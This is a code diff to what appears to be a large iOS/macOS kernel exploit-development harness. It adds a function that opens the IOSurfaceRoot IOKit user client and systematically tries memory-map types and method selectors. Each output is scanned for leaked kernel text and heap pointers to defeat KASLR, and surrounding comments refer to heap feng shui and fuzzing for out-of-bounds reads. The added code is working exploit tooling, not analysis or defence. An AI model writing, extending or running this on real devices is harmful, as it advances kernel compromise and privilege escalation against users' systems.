@@ -15902,6 +15902,257 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r372: IOConnectMapMemory + IOConnectCallMethod systematic scan.
+ * 1) Get IOKit connection (io_connect_t) for IOSurface user client.
+ * 2) Try IOConnectMapMemory with types 0-15 — look for kernel metadata mappings.
+ * 3) Try IOConnectCallScalarMethod with selectors 0-25, scan outputs for kptrs.
+ * 4) Try IOConnectCallStructMethod with selectors 0-25, scan for kptrs.
+ * 5) Try IOSurface's IOConnectMapMemory specifically.
+ */
+static void r372_probe(void) {
+    rlog("\n=== r372: IOKit Connection Scan for Kernel Pointers ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    void *iokitH = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+
+    /* IOKit function pointers */
+    typedef kern_return_t (*ioServiceGetMatching_t)(mach_port_t, CFDictionaryRef, io_iterator_t*);
+    typedef io_object_t (*ioIteratorNext_t)(io_iterator_t);
+    typedef kern_return_t (*ioServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t*);
+    typedef kern_return_t (*ioServiceClose_t)(io_connect_t);
+    typedef kern_return_t (*ioConnectMapMem_t)(io_connect_t, uint32_t, task_port_t, mach_vm_address_t*, mach_vm_size_t*, uint32_t);
+    typedef kern_return_t (*ioConnectCallScalar_t)(io_connect_t, uint32_t, const uint64_t*, uint32_t, uint64_t*, uint32_t*);
+    typedef kern_return_t (*ioConnectCallStruct_t)(io_connect_t, uint32_t, const void*, size_t, void*, size_t*);
+    typedef CFMutableDictionaryRef (*ioServiceMatching_t)(const char*);
+    typedef kern_return_t (*ioObjectRelease_t)(io_object_t);
+
+    ioServiceGetMatching_t ioSGM = (ioServiceGetMatching_t)dlsym(iokitH, "IOServiceGetMatchingServices");
+    ioIteratorNext_t ioIN = (ioIteratorNext_t)dlsym(iokitH, "IOIteratorNext");
+    ioServiceOpen_t ioSO = (ioServiceOpen_t)dlsym(iokitH, "IOServiceOpen");
+    ioServiceClose_t ioSC = (ioServiceClose_t)dlsym(iokitH, "IOServiceClose");
+    ioConnectMapMem_t ioMM = (ioConnectMapMem_t)dlsym(iokitH, "IOConnectMapMemory64");
+    ioConnectCallScalar_t ioCS = (ioConnectCallScalar_t)dlsym(iokitH, "IOConnectCallScalarMethod");
+    ioConnectCallStruct_t ioCSt = (ioConnectCallStruct_t)dlsym(iokitH, "IOConnectCallStructMethod");
+    ioServiceMatching_t ioSM = (ioServiceMatching_t)dlsym(iokitH, "IOServiceMatching");
+    ioObjectRelease_t ioOR = (ioObjectRelease_t)dlsym(iokitH, "IOObjectRelease");
+
+    if (!ioSGM || !ioIN || !ioSO || !ioSC || !ioCS || !ioSM || !ioOR) {
+        rlog("  FATAL: missing IOKit APIs\n");
+        goto r372_done;
+    }
+
+    /* ---- Part 1: Open IOSurfaceRoot user client ---- */
+    rlog("--- Part 1: Open IOSurfaceRoot user client ---\n");
+    fflush(stdout);
+
+    mach_port_t masterPort = 0;
+    CFMutableDictionaryRef matching = ioSM("IOSurfaceRoot");
+    if (!matching) { rlog("  FATAL: no matching dict\n"); goto r372_done; }
+
+    io_iterator_t iter = 0;
+    kern_return_t kr = ioSGM(masterPort, matching, &iter);
+    if (kr != KERN_SUCCESS) { rlog("  FATAL: IOServiceGetMatchingServices: 0x%x\n", kr); goto r372_done; }
+
+    io_service_t service = ioIN(iter);
+    if (!service) { rlog("  FATAL: no IOSurfaceRoot service\n"); ioOR(iter); goto r372_done; }
+    rlog("  Found IOSurfaceRoot service: %u\n", service);
+
+    io_connect_t conn = 0;
+    kr = ioSO(service, mach_task_self(), 0, &conn);
+    rlog("  IOServiceOpen type=0: kr=0x%x conn=%u\n", kr, conn);
+    ioOR(service);
+    ioOR(iter);
+    if (kr != KERN_SUCCESS || !conn) { rlog("  FATAL: can't open user client\n"); goto r372_done; }
+
+    /* ---- Part 2: IOConnectMapMemory with types 0-15 ---- */
+    rlog("\n--- Part 2: IOConnectMapMemory64 types 0-15 ---\n");
+    fflush(stdout);
+
+    if (ioMM) {
+        for (uint32_t mtype = 0; mtype <= 15; mtype++) {
+            mach_vm_address_t addr = 0;
+            mach_vm_size_t size = 0;
+            kr = ioMM(conn, mtype, mach_task_self(), &addr, &size, 1 /* kIOMapAnywhere */);
+            if (kr == KERN_SUCCESS && addr && size) {
+                rlog("  type=%u: MAPPED addr=0x%llx size=0x%llx\n",
+                    mtype, (unsigned long long)addr, (unsigned long long)size);
+                /* Scan mapped memory for kernel pointers */
+                uint8_t *base = (uint8_t*)(uintptr_t)addr;
+                int kptr_count = 0;
+                for (size_t off = 0; off + 8 <= (size_t)size && off < 65536; off += 8) {
+                    uint64_t v; memcpy(&v, base + off, 8);
+                    if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+                        rlog("    +0x%zx: 0x%llx [KTEXT!]\n", off, (unsigned long long)v);
+                        kptr_count++;
+                        if (kptr_count >= 20) { rlog("    (truncated)\n"); break; }
+                    } else if ((v >> 40) == 0xFFFFFF && kptr_count < 5) {
+                        rlog("    +0x%zx: 0x%llx [KHEAP]\n", off, (unsigned long long)v);
+                        kptr_count++;
+                    }
+                }
+                if (!kptr_count) rlog("    (no kernel pointers in first 64K)\n");
+            } else {
+                rlog("  type=%u: kr=0x%x (not available)\n", mtype, kr);
+            }
+        }
+    } else {
+        rlog("  IOConnectMapMemory64 not found\n");
+    }
+
+    /* ---- Part 3: Create a surface, get its IOKit connection ---- */
+    rlog("\n--- Part 3: Surface-specific IOKit probing ---\n");
+    fflush(stdout);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys372[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals372[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys372, (const void**)vals372, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    IOSurfaceRef surf = IOSurfaceCreate(crprops);
+    uint32_t sid = surf ? IOSurfaceGetID(surf) : 0;
+    rlog("  Surface ID=%u\n", sid);
+
+    /* ---- Part 4: IOConnectCallScalarMethod with surface-related selectors ---- */
+    rlog("\n--- Part 4: IOConnectCallScalarMethod scan (sel 0-25) ---\n");
+    fflush(stdout);
+
+    for (uint32_t sel = 0; sel <= 25; sel++) {
+        uint64_t input[4] = {sid, 0, 0, 0};
+        uint64_t output[16] = {0};
+        uint32_t outcnt = 16;
+
+        /* Try with surface ID as first input */
+        kr = ioCS(conn, sel, input, 1, output, &outcnt);
+        if (kr == KERN_SUCCESS && outcnt > 0) {
+            rlog("  sel=%u (1 in, %u out):", sel, outcnt);
+            int found_kptr = 0;
+            for (uint32_t i = 0; i < outcnt; i++) {
+                rlog(" 0x%llx", (unsigned long long)output[i]);
+                if ((output[i] >> 36) == 0xFFFFFFF0 || (output[i] >> 36) == 0xFFFFFFF1) {
+                    rlog("[KTEXT!]");
+                    found_kptr = 1;
+                } else if ((output[i] >> 40) == 0xFFFFFF) {
+                    rlog("[KHEAP]");
+                    found_kptr = 1;
+                }
+            }
+            rlog("\n");
+            if (found_kptr) rlog("  *** KERNEL POINTER FOUND IN SELECTOR %u ***\n", sel);
+        } else if (kr != KERN_SUCCESS) {
+            /* Only log interesting error codes, not generic failures */
+            if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                rlog("  sel=%u: kr=0x%x\n", sel, kr);
+            }
+        }
+
+        /* Also try with 0 inputs */
+        outcnt = 16;
+        memset(output, 0, sizeof(output));
+        kr = ioCS(conn, sel, NULL, 0, output, &outcnt);
+        if (kr == KERN_SUCCESS && outcnt > 0) {
+            rlog("  sel=%u (0 in, %u out):", sel, outcnt);
+            for (uint32_t i = 0; i < outcnt; i++) {
+                rlog(" 0x%llx", (unsigned long long)output[i]);
+                if ((output[i] >> 36) == 0xFFFFFFF0 || (output[i] >> 36) == 0xFFFFFFF1) {
+                    rlog("[KTEXT!]");
+                }
+            }
+            rlog("\n");
+        }
+    }
+
+    /* ---- Part 5: IOConnectCallStructMethod scan ---- */
+    rlog("\n--- Part 5: IOConnectCallStructMethod scan (sel 0-25) ---\n");
+    fflush(stdout);
+
+    for (uint32_t sel = 0; sel <= 25; sel++) {
+        uint8_t inbuf[64] = {0};
+        uint8_t outbuf[4096] = {0};
+        size_t outsize = sizeof(outbuf);
+
+        /* Put surface ID at start of input */
+        memcpy(inbuf, &sid, 4);
+
+        kr = ioCSt(conn, sel, inbuf, 8, outbuf, &outsize);
+        if (kr == KERN_SUCCESS && outsize > 0) {
+            rlog("  sel=%u: out=%zu bytes", sel, outsize);
+            int kptr_count = 0;
+            for (size_t off = 0; off + 8 <= outsize; off += 8) {
+                uint64_t v; memcpy(&v, outbuf + off, 8);
+                if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+                    rlog("\n    +%zu: 0x%llx [KTEXT!]", off, (unsigned long long)v);
+                    kptr_count++;
+                } else if ((v >> 40) == 0xFFFFFF) {
+                    rlog("\n    +%zu: 0x%llx [KHEAP]", off, (unsigned long long)v);
+                    kptr_count++;
+                }
+                if (kptr_count >= 20) break;
+            }
+            rlog("\n");
+            if (kptr_count) rlog("  *** KERNEL POINTERS in struct output sel=%u ***\n", sel);
+        }
+    }
+
+    /* ---- Part 6: Try alternate user client types ---- */
+    rlog("\n--- Part 6: Alternate user client types ---\n");
+    fflush(stdout);
+
+    for (uint32_t uctype = 1; uctype <= 5; uctype++) {
+        io_connect_t conn2 = 0;
+        matching = ioSM("IOSurfaceRoot");
+        if (!matching) continue;
+        io_iterator_t iter2 = 0;
+        kr = ioSGM(masterPort, matching, &iter2);
+        if (kr != KERN_SUCCESS) continue;
+        io_service_t svc2 = ioIN(iter2);
+        if (!svc2) { ioOR(iter2); continue; }
+        kr = ioSO(svc2, mach_task_self(), uctype, &conn2);
+        rlog("  type=%u: kr=0x%x conn=%u\n", uctype, kr, conn2);
+        if (kr == KERN_SUCCESS && conn2) {
+            /* Quick scalar probe */
+            uint64_t out[8] = {0};
+            uint32_t cnt = 8;
+            kr = ioCS(conn2, 0, NULL, 0, out, &cnt);
+            if (kr == KERN_SUCCESS && cnt > 0) {
+                rlog("    sel=0: %u outputs:", cnt);
+                for (uint32_t i = 0; i < cnt; i++)
+                    rlog(" 0x%llx", (unsigned long long)out[i]);
+                rlog("\n");
+            }
+            ioSC(conn2);
+        }
+        ioOR(svc2);
+        ioOR(iter2);
+    }
+
+    /* Cleanup */
+    ioSC(conn);
+    if (surf) CFRelease(surf);
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+r372_done:
+    if (iosurfH) dlclose(iosurfH);
+    if (iokitH) dlclose(iokitH);
+    rlog("\n=== r372 complete ===\n");
+    fflush(stdout);
+}
+
 /* r371: Internal property name probing + kernel heap feng shui.
  * 1) Set internal IOSurface property names and check if kernel
  *    overwrites them with real values (potential kptr leak).
@@ -56488,6 +56739,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 375) {
+            rlog("*** rounds=375: IOKit Connection Scan ***\n");
+            rlog("  IOConnectMapMemory + IOConnectCallMethod for all selectors.\n");
+            rlog("  Looking for kernel text/heap pointers in IOKit returns.\n\n");
+            fflush(stdout);
+            r372_probe();
+            goto done;
+        }
         if (rounds == 374) {
             rlog("*** rounds=374: Internal Property Probing + Heap Feng Shui ***\n");
             rlog("  Set internal IOSurface property names to check if kernel\n");
@@ -58691,7 +58950,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -68533,7 +68792,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
